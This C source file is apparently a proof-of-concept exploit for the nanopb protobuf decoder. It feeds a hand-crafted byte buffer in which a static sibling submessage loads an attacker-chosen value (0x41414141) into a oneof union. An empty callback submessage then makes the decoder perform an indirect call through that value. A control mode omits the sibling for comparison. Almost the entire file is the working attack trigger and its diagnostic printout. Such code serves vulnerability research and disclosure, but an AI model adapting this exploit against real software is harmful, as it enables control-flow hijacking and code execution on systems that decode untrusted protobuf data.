#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <nanopb/pb_decode.h>
#include "submsg_ft_callback.pb.h"

/* Marker the hijacked control flow lands on. Its address is printed so the
   reader can see we are NOT jumping here — we jump to the wire-supplied value. */
static bool never_called(pb_decode_ctx_t *s, const pb_field_iter_t *f, void **a) {
    (void)s;(void)f;(void)a;
    printf("[poc] never_called() executed\n");
    return true;
}

int main(int argc, char **argv) {
    int control = (argc > 1 && strcmp(argv[1], "--control") == 0);

    /* submsg2 (tag 3, STATIC int32) first, carrying the pointer bytes,
       then submsg1 (tag 2, CALLBACK) which triggers the indirect call. */
    static const uint8_t exploit[] = {
        0x1a, 0x06, 0x08, 0xc1, 0x82, 0x85, 0x8a, 0x04,   /* submsg2{intvalue=0x41414141} */
        0x12, 0x00                                        /* submsg1{} (empty)            */
    };
    /* single variable flipped: the data-bearing sibling (tag 3) is omitted,
       so the union is never populated from the wire. */
    static const uint8_t controlbuf[] = {
        0x12, 0x00                                        /* submsg1{} only               */
    };

    const uint8_t *buf = control ? controlbuf : exploit;
    size_t len         = control ? sizeof controlbuf : sizeof exploit;

    printf("[poc] mode=%s\n[poc] wire bytes (%zu):", control ? "CONTROL (no sibling tag 3)" : "EXPLOIT", len);
    size_t i;
    for (i = 0; i < len; i++) printf(" %02x", buf[i]);
    printf("\n[poc] never_called() lives at %p\n", (void*)never_called);

    OneOfMessage msg = OneOfMessage_init_zero;   /* app registers NO callbacks */
    pb_decode_ctx_t is;
    pb_init_decode_ctx_for_buffer(&is, buf, len);

    printf("[poc] calling pb_decode()...\n"); fflush(stdout);
    bool ok = pb_decode(&is, OneOfMessage_fields, &msg);
    printf("[poc] pb_decode returned %d (%s), which_value=%d\n",
           ok, ok ? "ok" : PB_GET_ERROR(&is), (int)msg.which_value);
    printf("[poc] union first 8 bytes:");
    unsigned char *u = (unsigned char*)&msg.value;
    for (i=0;i<8;i++) printf(" %02x", u[i]);
    printf("\n[poc] clean exit\n");
    return 0;
}
